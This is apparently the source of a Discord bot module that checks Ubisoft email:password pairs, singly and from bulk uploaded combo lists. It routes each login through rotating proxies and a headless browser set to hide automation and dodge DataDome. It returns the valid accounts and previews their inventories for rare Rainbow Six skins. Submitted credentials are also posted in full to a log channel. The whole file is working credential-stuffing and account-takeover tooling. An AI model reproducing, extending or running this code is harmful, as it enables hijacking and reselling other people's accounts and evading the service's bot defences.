import discord
from discord import app_commands
from discord.ext import commands
import base64
import utils
import database as db
import asyncio
import random
import io
import os
import json
from playwright.async_api import async_playwright

UBI_APP_ID = "314d4fef-e568-454a-ae06-43e3bece12a6"

class Checker(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self.proxies = self.load_proxies()
        
        self.skin_cache = {}
        if os.path.exists("r6-skins-cache.json"):
            try:
                with open("r6-skins-cache.json", "r", encoding="utf-8") as f:
                    self.skin_cache = json.load(f)
            except Exception:
                pass

    def load_proxies(self):
        if os.path.exists("proxies.txt"):
            with open("proxies.txt", "r") as f:
                return [line.strip() for line in f if line.strip()]
        return []

    async def log_to_channel(self, interaction: discord.Interaction, embed: discord.Embed):
        log_channel_id = db.get_config("check_log_channel")
        if log_channel_id:
            try:
                channel = self.bot.get_channel(int(log_channel_id))
                if channel:
                    await channel.send(embed=embed)
            except Exception:
                pass

    @app_commands.command(name="check", description="Check if a Ubisoft email:pass account is valid.")
    @app_commands.describe(account="Format: email:password")
    async def check(self, interaction: discord.Interaction, account: str):
        await interaction.response.defer(ephemeral=True)
        
        if ":" not in account:
            return await interaction.followup.send("❌ Invalid format. Use `email:password`.", ephemeral=True)

        email, password = account.split(":", 1)
        
        proxy = random.choice(self.proxies) if self.proxies else None
        
        embed = discord.Embed(color=0x5865F2, title="🔍 Account Check", description=f"**User:** {interaction.user.mention}\n**Input:** `{account}`\n\n⏳ *Booting browser... (This takes 10-15 seconds)*")
        await interaction.followup.send(embed=embed, ephemeral=True)

        try:
            async with async_playwright() as p:
                launch_args = ["--disable-blink-features=AutomationControlled", "--no-sandbox", "--disable-setuid-sandbox"]
                launch_kwargs = {"headless": True, "args": launch_args}
                
                if proxy:
                    proxy = proxy.strip()
                    if "@" in proxy:
                        auth_part, server_part = proxy.split("@")
                        
                        if "://" in auth_part:
                            protocol = auth_part.split("://")[0]
                            user_pass = auth_part.split("://")[1]
                        else:
                            protocol = "http"
                            user_pass = auth_part
                            
                        user, pwd = user_pass.split(":", 1)
                        
                        server_host = server_part.replace("http://", "").replace("https://", "")
                        
                        launch_kwargs["proxy"] = {
                            "server": f"http://{server_host}",
                            "username": user,
                            "password": pwd
                        }
                    else:
                        launch_kwargs["proxy"] = {"server": proxy}

                browser = await p.chromium.launch(**launch_kwargs)
                context = await browser.new_context(
                    user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                )
                page = await context.new_page()
                
                await page.goto("https://account.ubisoft.com/")
                await page.wait_for_timeout(3000)

                b64_auth = base64.b64encode(f"{email}:{password}".encode('utf-8')).decode('utf-8')
                
                js_code = f"""
                async () => {{
                    const res = await fetch("https://public-ubiservices.ubi.com/v3/profiles/sessions", {{
                        method: "POST",
                        headers: {{
                            "Content-Type": "application/json",
                            "Ubi-AppId": "{UBI_APP_ID}",
                            "Authorization": "Basic {b64_auth}"
                        }},
                        body: JSON.stringify({{ rememberMe: true }})
                    }});
                    return res.status;
                }}
                """
                
                status_code = await page.evaluate(js_code)
                await browser.close()

                if status_code == 200:
                    embed.color = 0x57F287
                    embed.add_field(name="Status", value="✅ Valid")
                    await interaction.followup.send("✅ Account is valid.", ephemeral=True)
                elif status_code == 401:
                    embed.color = 0xED4245
                    embed.add_field(name="Status", value="❌ Invalid / 2FA")
                    await interaction.followup.send("❌ Account is dead or requires 2FA.", ephemeral=True)
                elif status_code in (403, 429):
                    embed.color = 0xED4245
                    embed.add_field(name="Status", value="🚫 DataDome Blocked")
                    await interaction.followup.send("🚫 **Blocked:** DataDome blocked this IP.", ephemeral=True)
                else:
                    embed.color = 0xFEE75C
                    embed.add_field(name="Status", value=f"⚠️ Error {status_code}")
                    await interaction.followup.send(f"⚠️ Error: HTTP {status_code}", ephemeral=True)

        except Exception as e:
            err_msg = str(e)
            if len(err_msg) > 1900:
                err_msg = err_msg[:1900] + "..."
            await interaction.followup.send(f"❌ Browser error: {err_msg}", ephemeral=True)

        await self.log_to_channel(interaction, embed)

    @app_commands.command(name="preview", description="Preview an account's R6 inventory and rare items.")
    @app_commands.describe(account="Format: email:password")
    async def preview(self, interaction: discord.Interaction, account: str):
        if not await utils.owner_only(interaction):
            return

        await interaction.response.defer(ephemeral=True)
        
        if ":" not in account:
            return await interaction.followup.send("❌ Invalid format. Use `email:password`.", ephemeral=True)

        email, password = account.split(":", 1)
        
        try:
            from fetch_inventory import get_account_data
            result = await asyncio.to_thread(get_account_data, email, password)
        except Exception as e:
            return await interaction.followup.send(f"❌ Error fetching data: {e}", ephemeral=True)

        if "error" in result:
            return await interaction.followup.send(f"❌ Error: {result['error']}", ephemeral=True)
            
        username = result.get("username", "Unknown")
        profile_id = result.get("profile_id", "Unknown")
        inventory = result.get("inventory", {})
        items = inventory.get("items", [])
        
        embed = discord.Embed(
            color=0x5865F2,
            title=f"👤 Account Preview: {username}",
            description=f"**Profile ID:** `{profile_id}`\n**Total Items:** `{len(items)}`"
        )
        
        glaciers = 0
        black_ice = 0
        
        if self.skin_cache:
            for item in items:
                item_id = item.get('id')
                if item_id in self.skin_cache:
                    cache_entry = self.skin_cache[item_id]
                    skin_name = cache_entry.get('name', '') if isinstance(cache_entry, dict) else str(cache_entry)
                    
                    if "Glacier" in skin_name: glaciers += 1
                    if "Black Ice" in skin_name: black_ice += 1
            
            embed.add_field(name="❄️ Rare Skins", value=f"Black Ice: `{black_ice}`\nGlacier: `{glaciers}`", inline=True)
        else:
            embed.add_field(name="❄️ Rare Skins", value="⚠️ Cache not loaded", inline=True)
        
        embed.add_field(name="🎖️ Ranked", value="Rank data not fetched", inline=True)
        embed.set_footer(text="Use /check to verify login status")
        
        await interaction.followup.send(embed=embed, ephemeral=True)

    @app_commands.command(name="checkfile", description="[Owner] Upload a .txt file to filter valid accounts.")
    @app_commands.describe(file=".txt file with email:pass on each line")
    async def checkfile(self, interaction: discord.Interaction, file: discord.Attachment):
        if not await utils.owner_only(interaction):
            return
            
        if not file.filename.endswith(".txt"):
            return await interaction.response.send_message("❌ Please upload a `.txt` file.", ephemeral=True)
            
        await interaction.response.defer(ephemeral=True)
        
        try:
            content = await file.read()
            lines = [line.strip() for line in content.decode('utf-8').splitlines() if line.strip()]
        except Exception as e:
            return await interaction.followup.send(f"❌ Failed to read file: {e}", ephemeral=True)

        total = len(lines)
        if total == 0:
            return await interaction.followup.send("❌ File is empty.", ephemeral=True)

        await interaction.followup.send(f"⏳ Checking **{total}** accounts (Playwright mode is slow, this will take a while)...", ephemeral=True)

        valid_accounts = []
        sem = asyncio.Semaphore(5) 
        
        async def test_account(acc):
            async with sem:
                creds = acc.split("|")[0].strip()
                if ":" not in creds:
                    return
                
                email, password = creds.split(":", 1)
                proxy = random.choice(self.proxies) if self.proxies else None
                
                try:
                    async with async_playwright() as p:
                        launch_args = ["--disable-blink-features=AutomationControlled", "--no-sandbox", "--disable-setuid-sandbox"]
                        launch_kwargs = {"headless": True, "args": launch_args}
                        
                        if proxy:
                            proxy = proxy.strip()
                            if "@" in proxy:
                                auth_part, server_part = proxy.split("@")
                                
                                if "://" in auth_part:
                                    protocol = auth_part.split("://")[0]
                                    user_pass = auth_part.split("://")[1]
                                else:
                                    protocol = "http"
                                    user_pass = auth_part
                                    
                                user, pwd = user_pass.split(":", 1)
                                
                                server_host = server_part.replace("http://", "").replace("https://", "")
                                
                                launch_kwargs["proxy"] = {
                                    "server": f"http://{server_host}",
                                    "username": user,
                                    "password": pwd
                                }
                            else:
                                launch_kwargs["proxy"] = {"server": proxy}

                        browser = await p.chromium.launch(**launch_kwargs)
                        context = await browser.new_context()
                        page = await context.new_page()
                        
                        await page.goto("https://account.ubisoft.com/")
                        await page.wait_for_timeout(2000) 

                        b64_auth = base64.b64encode(f"{email}:{password}".encode('utf-8')).decode('utf-8')
                        js_code = f"""
                        async () => {{
                            const res = await fetch("https://public-ubiservices.ubi.com/v3/profiles/sessions", {{
                                method: "POST",
                                headers: {{
                                    "Content-Type": "application/json",
                                    "Ubi-AppId": "{UBI_APP_ID}",
                                    "Authorization": "Basic {b64_auth}"
                                }},
                                body: JSON.stringify({{ rememberMe: true }})
                            }});
                            return res.status;
                        }}
                        """
                        status_code = await page.evaluate(js_code)
                        await browser.close()

                        if status_code == 200:
                            valid_accounts.append(acc)
                except Exception:
                    pass

        tasks = [test_account(acc) for acc in lines]
        await asyncio.gather(*tasks)

        if not valid_accounts:
            return await interaction.followup.send("❌ No valid accounts found.", ephemeral=True)

        valid_text = "\n".join(valid_accounts)
        out_file = discord.File(io.BytesIO(valid_text.encode()), filename=f"valid_{file.filename}")

        embed = discord.Embed(
            color=0x57F287,
            title="✅ File Checked",
            description=f"Found **{len(valid_accounts)}** valid accounts out of **{total}**."
        )
        
        await interaction.followup.send(embed=embed, file=out_file, ephemeral=True)

    @app_commands.command(name="checkprelink", description="Submit a pre-linked console account (Xbox/PS).")
    @app_commands.describe(console="Xbox or PlayStation", details="Username or Email")
    async def checkprelink(self, interaction: discord.Interaction, console: str, details: str):
        await interaction.response.defer(ephemeral=True)
        
        embed = discord.Embed(
            color=0x5865F2, 
            title="🎮 Pre-Linked Check",
            description=f"**User:** {interaction.user.mention}\n**Console:** {console.capitalize()}\n**Details:** `{details}`"
        )
        await interaction.followup.send("✅ Details submitted for manual review.", ephemeral=True)
        await self.log_to_channel(interaction, embed)

async def setup(bot):
    await bot.add_cog(Checker(bot))
